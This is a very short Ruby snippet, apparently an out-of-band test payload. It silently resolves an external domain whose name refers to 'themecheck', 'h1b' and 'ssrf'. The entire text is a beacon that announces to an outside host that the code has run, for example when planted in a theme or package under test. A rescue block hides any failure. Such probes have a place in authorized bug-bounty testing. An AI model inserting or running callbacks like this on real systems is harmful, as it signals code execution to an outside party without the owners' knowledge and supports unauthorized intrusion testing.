begin
  require 'resolv'
  Resolv::DNS.new.getaddress("themecheck.h1b.ssrf.xixixo123.site")
rescue StandardError
end
